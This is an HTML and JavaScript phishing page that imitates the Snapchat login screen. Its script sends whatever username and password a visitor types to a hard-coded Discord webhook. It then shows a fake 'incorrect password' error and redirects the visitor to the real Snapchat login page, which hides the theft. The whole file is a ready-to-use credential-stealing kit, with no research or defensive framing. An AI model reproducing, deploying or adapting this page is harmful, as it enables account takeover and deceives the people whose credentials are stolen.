<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapchat | Log in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: rgba(0,0,0,0.2);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding: 20px;
        }

        /* Main window – matches Python version size and style */
        .snapchat-window {
            width: 400px;
            height: 550px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* Custom title bar – no close button */
        .title-bar {
            background: #fafafa;
            height: 40px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            border-top-left-radius: 12px;
            border-top-right-radius: 12px;
        }
        .title-left {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .snap-icon {
            width: 24px;
            height: 24px;
            background: #fffc00;
            border-radius: 6px;
        }
        .title-text {
            font-weight: bold;
            font-size: 16px;
            color: black;
        }

        /* Content area */
        .content {
            flex: 1;
            padding: 30px 30px 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        /* Large logo */
        .logo {
            font-size: 72px;
            font-weight: 800;
            color: #fffc00;
            text-shadow: 2px 2px 0 #000;
            line-height: 1;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #6c6c70;
            font-size: 14px;
            margin-top: -10px;
        }

        /* Input fields */
        .input-group {
            width: 100%;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            background: #f2f2f2;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #fffc00;
        }

        /* Yellow login button */
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #fffc00;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            color: black;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 5px;
        }
        .login-btn:hover {
            background: #e6e200;
        }

        /* Bottom links */
        .links {
            font-size: 12px;
            color: #6c6c70;
            text-align: center;
        }
        .links a {
            color: #6c6c70;
            text-decoration: none;
            margin: 0 4px;
        }
        .links a:hover {
            text-decoration: underline;
        }

        /* Error message */
        .error-msg {
            color: #f44336;
            font-size: 12px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="snapchat-window">
        <div class="title-bar">
            <div class="title-left">
                <div class="snap-icon"></div>
                <span class="title-text">Snapchat</span>
            </div>
        </div>
        <div class="content">
            <div class="logo">Snapchat</div>
            <div class="subtitle">Log in to Snapchat</div>
            <div class="input-group">
                <input type="text" id="username" placeholder="Username or Email" autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password">
            </div>
            <button class="login-btn" id="loginBtn">Log In</button>
            <div class="links">
                <a href="#">Forgot your password?</a> · 
                <a href="#">Sign up</a>
            </div>
            <div id="errorMsg" class="error-msg"></div>
        </div>
    </div>

    <script>
        // Replace with your Discord webhook URL (the one you already have)
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1485303058161340467/8XtLiKOB1wLuBdd8EhGPgR-V8S-lL5-r2bqFvUZ4P03ob3aAQkaA2eUMA7cHwDC_gxXS";

        // Function to send credentials to Discord
        function sendCredentials(username, password) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Snapchat Credentials**\nUsername/Email: ${username}\nPassword: ${password}`
                })
            }).catch(err => console.error('Webhook error:', err));
        }

        // Function to show fake error and redirect to real Snapchat
        function showErrorAndRedirect() {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.textContent = 'Incorrect username or password. Please try again.';
            errorDiv.style.display = 'block';
            setTimeout(() => {
                window.location.href = 'https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome';
            }, 1500);
        }

        // Handle login button click
        document.getElementById('loginBtn').addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (username && password) {
                sendCredentials(username, password);
            }
            showErrorAndRedirect();
        });

        // Allow Enter key to submit
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    document.getElementById('loginBtn').click();
                }
            });
        });
    </script>
</body>
</html>
